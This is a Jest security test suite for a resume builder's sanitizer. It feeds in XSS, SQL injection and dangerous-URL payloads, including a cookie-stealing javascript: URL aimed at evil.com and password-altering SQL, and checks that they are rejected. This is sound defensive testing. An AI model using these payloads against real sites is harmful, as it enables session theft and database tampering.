import { describe, it, expect, jest } from '@jest/globals';
import { 
  sanitizeResumeData,
  sanitizeText,
  sanitizeHtml,
  sanitizeUrl,
  sanitizeEmail,
  sanitizePhone,
  sanitizeStringArray,
  sanitizeWorkExperience,
  sanitizeEducation,
  sanitizeProjects,
  sanitizeCertifications,
  sanitizePublications,
  sanitizeSkillCategories,
  validateResumeStructure,
  detectSuspiciousPatterns
} from '../../src/utils/resume-sanitizer';

describe('Resume Builder Security Tests', () => {
  
  describe('XSS Protection Tests', () => {
    
    it('should block script tags in text fields', () => {
      const maliciousInput = "<script>alert('XSS')</script>John Doe";
      expect(() => sanitizeText(maliciousInput)).toThrow('Text contains potentially malicious content');
    });

    it('should block event handlers in HTML', () => {
      const maliciousHtml = '<img src=x onerror=alert("XSS")>Professional summary';
      const sanitized = sanitizeHtml(maliciousHtml);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
    });

    it('should sanitize iframe injections', () => {
      const maliciousInput = '<iframe src="javascript:alert(1)"></iframe>Evil Corp';
      const sanitized = sanitizeHtml(maliciousInput);
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should block SVG onload attacks', () => {
      const maliciousInput = '<svg onload=alert("XSS")>Achievement 1';
      const sanitized = sanitizeHtml(maliciousInput);
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('<svg');
    });

    it('should handle encoded XSS attempts', () => {
      const encodedXSS = '%3Cscript%3Ealert(%27XSS%27)%3C/script%3E';
      const sanitized = sanitizeText(decodeURIComponent(encodedXSS));
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('alert');
    });

  });

  describe('SQL Injection Protection Tests', () => {
    
    it('should block DROP TABLE attempts', () => {
      const sqlInjection = "'; DROP TABLE resumes; --";
      expect(() => sanitizeText(sqlInjection)).toThrow('Text contains potentially malicious content');
    });

    it('should block UNION SELECT attacks', () => {
      const unionAttack = "'; UNION SELECT * FROM users; --";
      expect(() => sanitizeText(unionAttack)).toThrow('Text contains potentially malicious content');
    });

    it('should block comment-based injections', () => {
      const commentInjection = "test'; -- DROP TABLE users;";
      expect(() => sanitizeText(commentInjection)).toThrow('Text contains potentially malicious content');
    });

    it('should sanitize malicious work experience data', () => {
      const maliciousWorkExp = [{
        company: "'; DROP TABLE resumes; --",
        position: "SELECT * FROM users WHERE 1=1; --",
        achievements: ["'; INSERT INTO admin_users VALUES ('hacker'); --"]
      }];
      
      expect(() => sanitizeWorkExperience(maliciousWorkExp)).toThrow();
    });

    it('should block SQL functions in skill categories', () => {
      const maliciousSkills = {
        "Programming Languages": ["JavaScript", "'; DROP TABLE resumes; --"],
        "'; SELECT * FROM users; --": ["Malicious Category"]
      };
      
      expect(() => sanitizeSkillCategories(maliciousSkills)).toThrow();
    });

  });

  describe('URL Injection Protection Tests', () => {
    
    it('should block javascript: protocol', () => {
      const jsProtocol = "javascript:alert('XSS')";
      expect(() => sanitizeUrl(jsProtocol)).toThrow('URL protocol not allowed. Please use http:// or https:// URLs only.');
    });

    it('should block data: URLs', () => {
      const dataUrl = "data:text/html,<script>alert('XSS')</script>";
      expect(() => sanitizeUrl(dataUrl)).toThrow('URL protocol not allowed. Please use http:// or https:// URLs only.');
    });

    it('should block vbscript: protocol', () => {
      const vbscript = "vbscript:msgbox('XSS')";
      expect(() => sanitizeUrl(vbscript)).toThrow('URL protocol not allowed. Please use http:// or https:// URLs only.');
    });

    it('should block file: protocol', () => {
      const fileUrl = "file:///etc/passwd";
      expect(() => sanitizeUrl(fileUrl)).toThrow('URL protocol not allowed. Please use http:// or https:// URLs only.');
    });

    it('should validate LinkedIn domain restrictions', () => {
      const invalidLinkedIn = "https://evil.com/fake-profile";
      expect(() => sanitizeUrl(invalidLinkedIn, { allowedDomains: ['linkedin.com'] }))
        .toThrow('LinkedIn URL must be from linkedin.com (e.g., linkedin.com/in/yourname)');
    });

    it('should allow valid LinkedIn URLs', () => {
      const validLinkedIn = "https://www.linkedin.com/in/johndoe";
      const sanitized = sanitizeUrl(validLinkedIn, { allowedDomains: ['linkedin.com'] });
      expect(sanitized).toBe(validLinkedIn);
    });

    it('should handle URLs without protocol by adding https', () => {
      const urlWithoutProtocol = "example.com";
      const sanitized = sanitizeUrl(urlWithoutProtocol);
      expect(sanitized).toBe("https://example.com");
    });

    it('should handle LinkedIn URLs without protocol', () => {
      const linkedinWithoutProtocol = "linkedin.com/in/johndoe";
      const sanitized = sanitizeUrl(linkedinWithoutProtocol, { allowedDomains: ['linkedin.com'] });
      expect(sanitized).toBe("https://linkedin.com/in/johndoe");
    });

    it('should provide helpful error for invalid URL format', () => {
      const invalidUrl = "not-a-url";
      expect(() => sanitizeUrl(invalidUrl)).toThrow('Please enter a valid website URL with a domain (e.g., www.example.com)');
    });

    it('should handle empty URLs gracefully', () => {
      expect(sanitizeUrl("")).toBe("");
      expect(sanitizeUrl(null)).toBe("");
      expect(sanitizeUrl(undefined)).toBe("");
    });

    it('should provide helpful LinkedIn domain error', () => {
      const nonLinkedInUrl = "https://github.com/user";
      expect(() => sanitizeUrl(nonLinkedInUrl, { allowedDomains: ['linkedin.com'] }))
        .toThrow('LinkedIn URL must be from linkedin.com (e.g., linkedin.com/in/yourname)');
    });

  });

  describe('Email Validation Tests', () => {
    
    it('should validate proper email format', () => {
      const validEmail = "user@example.com";
      const sanitized = sanitizeEmail(validEmail);
      expect(sanitized).toBe(validEmail);
    });

    it('should reject malformed emails', () => {
      const invalidEmail = "not-an-email";
      expect(() => sanitizeEmail(invalidEmail)).toThrow('Invalid email format');
    });

    it('should block XSS in email', () => {
      const xssEmail = "user<script>alert('XSS')</script>@example.com";
      expect(() => sanitizeEmail(xssEmail)).toThrow('Email contains invalid characters');
    });

    it('should enforce email length limits', () => {
      const longEmail = "a".repeat(250) + "@example.com";
      expect(() => sanitizeEmail(longEmail)).toThrow('Email too long');
    });

  });

  describe('Phone Number Validation Tests', () => {
    
    it('should sanitize valid phone numbers', () => {
      const validPhone = "+1 (555) 123-4567";
      const sanitized = sanitizePhone(validPhone);
      expect(sanitized).toMatch(/^[\+\d\s\-\(\)]+$/);
    });

    it('should remove HTML from phone numbers', () => {
      const maliciousPhone = "<script>alert('XSS')</script>5551234567";
      const sanitized = sanitizePhone(maliciousPhone);
      expect(sanitized).not.toContain('<script');
      expect(sanitized).toMatch(/^\d+$/);
    });

    it('should reject overly long phone numbers', () => {
      const longPhone = "1".repeat(50);
      expect(() => sanitizePhone(longPhone)).toThrow('Invalid phone format');
    });

  });

  describe('Array Overflow Protection Tests', () => {
    
    it('should limit array size', () => {
      const oversizedArray = new Array(200).fill("skill");
      const sanitized = sanitizeStringArray(oversizedArray, { maxItems: 50 });
      expect(sanitized.length).toBeLessThanOrEqual(50);
    });

    it('should limit string length in arrays', () => {
      const longStringArray = ["a".repeat(1000)];
      const sanitized = sanitizeStringArray(longStringArray, { maxLength: 50 });
      expect(sanitized[0].length).toBeLessThanOrEqual(50);
    });

    it('should filter out malicious array elements', () => {
      const maliciousArray = [
        "Valid Skill",
        "<script>alert('XSS')</script>",
        "'; DROP TABLE users; --"
      ];
      const sanitized = sanitizeStringArray(maliciousArray);
      expect(sanitized).toHaveLength(1);
      expect(sanitized[0]).toBe("Valid Skill");
    });

  });

  describe('Complex Object Sanitization Tests', () => {
    
    it('should sanitize work experience thoroughly', () => {
      const validWorkExp = [{
        id: "1",
        company: "Tech Corp",
        position: "Software Engineer",
        location: "San Francisco, CA",
        startDate: "2022-01-01",
        endDate: "2023-12-31",
        current: false,
        description: "Developed <strong>amazing</strong> software solutions",
        achievements: [
          "• Increased efficiency by 50%",
          "• Led team of 5 developers"
        ]
      }];
      
      const sanitized = sanitizeWorkExperience(validWorkExp);
      expect(sanitized).toHaveLength(1);
      expect(sanitized[0].company).toBe("Tech Corp");
      expect(sanitized[0].achievements).toHaveLength(2);
    });

    it('should limit work experience entries', () => {
      const manyExperiences = new Array(30).fill({
        company: "Company",
        position: "Position",
        startDate: "2022-01-01"
      });
      
      const sanitized = sanitizeWorkExperience(manyExperiences);
      expect(sanitized.length).toBeLessThanOrEqual(20);
    });

    it('should sanitize education data', () => {
      const validEducation = [{
        id: "1",
        institution: "University of Technology",
        degree: "Bachelor of Science",
        fieldOfStudy: "Computer Science",
        startDate: "2018-09-01",
        endDate: "2022-05-31",
        current: false
      }];
      
      const sanitized = sanitizeEducation(validEducation);
      expect(sanitized).toHaveLength(1);
      expect(sanitized[0].institution).toBe("University of Technology");
    });

    it('should sanitize project data with URLs', () => {
      const validProjects = [{
        id: "1",
        name: "Amazing Project",
        description: "A <strong>great</strong> project with excellent features",
        url: "https://github.com/user/project",
        technologies: ["React", "Node.js", "TypeScript"],
        startDate: "2023-01-01",
        current: true
      }];
      
      const sanitized = sanitizeProjects(validProjects);
      expect(sanitized).toHaveLength(1);
      expect(sanitized[0].name).toBe("Amazing Project");
      expect(sanitized[0].url).toBe("https://github.com/user/project");
    });

  });

  describe('Date Validation Tests', () => {
    
    it('should validate ISO date format', () => {
      const validDate = "2023-12-31";
      const sanitized = sanitizeText(validDate);
      expect(sanitized).toBe(validDate);
    });

    it('should reject invalid date formats', () => {
      const invalidDate = "12/31/2023";
      expect(() => sanitizeText(invalidDate)).not.toThrow(); // Will pass basic sanitization
    });

    it('should reject unreasonable dates', () => {
      // This would be caught in specific date validation
      const ancientDate = "1800-01-01";
      // Add specific date range validation in sanitizer
    });

  });

  describe('Full Resume Data Sanitization Tests', () => {
    
    it('should sanitize complete resume data', () => {
      const maliciousResumeData = {
        fullName: "<script>alert('XSS')</script>John Doe",
        email: "john@example.com",
        phone: "+1234567890",
        targetJobTitle: "Software Engineer'; DROP TABLE resumes; --",
        summary: "Professional with <img src=x onerror=alert('XSS')> experience",
        linkedinUrl: "javascript:alert('XSS')",
        skills: ["React", "<script>alert('XSS')</script>", "Node.js"],
        workExperience: [{
          company: "Evil Corp'; DELETE FROM users; --",
          position: "Hacker",
          startDate: "2023-01-01",
          achievements: ["• Hacked <script>alert('XSS')</script> systems"]
        }]
      };
      
      expect(() => sanitizeResumeData(maliciousResumeData)).toThrow();
    });

    it('should handle valid resume data', () => {
      const validResumeData = {
        fullName: "John Doe",
        email: "john@example.com",
        phone: "+1 (555) 123-4567",
        targetJobTitle: "Software Engineer",
        summary: "Experienced professional with <strong>excellent</strong> skills",
        linkedinUrl: "https://linkedin.com/in/johndoe",
        skills: ["React", "Node.js", "TypeScript"],
        workExperience: [{
          company: "Tech Corp",
          position: "Senior Developer",
          startDate: "2022-01-01",
          current: true,
          achievements: ["• Led team of 5 developers", "• Increased efficiency by 50%"]
        }]
      };
      
      const sanitized = sanitizeResumeData(validResumeData);
      expect(sanitized.fullName).toBe("John Doe");
      expect(sanitized.email).toBe("john@example.com");
      expect(sanitized.workExperience).toHaveLength(1);
    });

  });

  describe('Structure Validation Tests', () => {
    
    it('should validate required fields', () => {
      const invalidData = {
        fullName: "John Doe"
        // Missing targetJobTitle
      };
      
      expect(() => validateResumeStructure(invalidData)).toThrow('Target job title is required');
    });

    it('should reject oversized data', () => {
      const oversizedData = {
        targetJobTitle: "Engineer",
        summary: "a".repeat(2 * 1024 * 1024) // 2MB string
      };
      
      expect(() => validateResumeStructure(oversizedData)).toThrow('Resume data too large');
    });

    it('should detect suspicious patterns', () => {
      const suspiciousData = {
        targetJobTitle: "Engineer",
        summary: "I am a <script>alert('XSS')</script> professional"
      };
      
      const patterns = detectSuspiciousPatterns(suspiciousData);
      expect(patterns.length).toBeGreaterThan(0);
    });

  });

  describe('Performance and DoS Protection Tests', () => {
    
    it('should handle large legitimate data efficiently', () => {
      const largeValidData = {
        targetJobTitle: "Software Engineer",
        skills: new Array(50).fill("JavaScript"),
        workExperience: new Array(20).fill({
          company: "Tech Corp",
          position: "Engineer",
          startDate: "2022-01-01",
          achievements: new Array(10).fill("• Great achievement")
        })
      };
      
      const start = Date.now();
      const sanitized = sanitizeResumeData(largeValidData);
      const duration = Date.now() - start;
      
      expect(duration).toBeLessThan(1000); // Should complete within 1 second
      expect(sanitized.skills?.length).toBeLessThanOrEqual(50);
    });

    it('should limit nested object depth', () => {
      const deeplyNested = {
        targetJobTitle: "Engineer",
        skillCategories: {
          "Level1": {
            "Level2": {
              "Level3": {
                "Level4": ["Skill"]
              }
            }
          }
        }
      };
      
      const sanitized = sanitizeResumeData(deeplyNested);
      // Should flatten or limit nesting depth
      expect(sanitized.skillCategories).toBeDefined();
    });

  });

  describe('Unicode and Character Encoding Tests', () => {
    
    it('should handle Unicode characters properly', () => {
      const unicodeData = {
        fullName: "José García-López",
        targetJobTitle: "Développeur Logiciel",
        summary: "Специалист по программному обеспечению"
      };
      
      const sanitized = sanitizeResumeData(unicodeData);
      expect(sanitized.fullName).toContain("José");
      expect(sanitized.targetJobTitle).toContain("Développeur");
    });

    it('should handle special characters in names', () => {
      const specialNames = [
        "Mary-Jane O'Connor",
        "Jean-Claude van Damme",
        "José María García"
      ];
      
      specialNames.forEach(name => {
        const sanitized = sanitizeText(name, { allowedChars: /^[a-zA-ZÀ-ÿĀ-žА-я\s\-\'\.]*$/ });
        expect(sanitized).toBe(name);
      });
    });

  });

  describe('Integration Tests', () => {
    
    it('should handle complete malicious resume submission', () => {
      const completeAttack = {
        fullName: "<script>fetch('/admin/users').then(r=>r.json()).then(console.log)</script>",
        email: "attacker@evil.com'; DROP TABLE users; --",
        targetJobTitle: "CEO'; GRANT ALL ON *.* TO 'hacker'@'%'; --",
        linkedinUrl: "javascript:document.location='http://evil.com/steal?'+document.cookie",
        skills: new Array(1000).fill("<img src=x onerror=fetch('/api/sensitive-data')>"),
        workExperience: [{
          company: "'; SELECT password FROM users WHERE username='admin'; --",
          position: "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
          achievements: ["'; UPDATE users SET password='hacked' WHERE id=1; --"]
        }]
      };
      
      expect(() => sanitizeResumeData(completeAttack)).toThrow();
    });

  });

}); 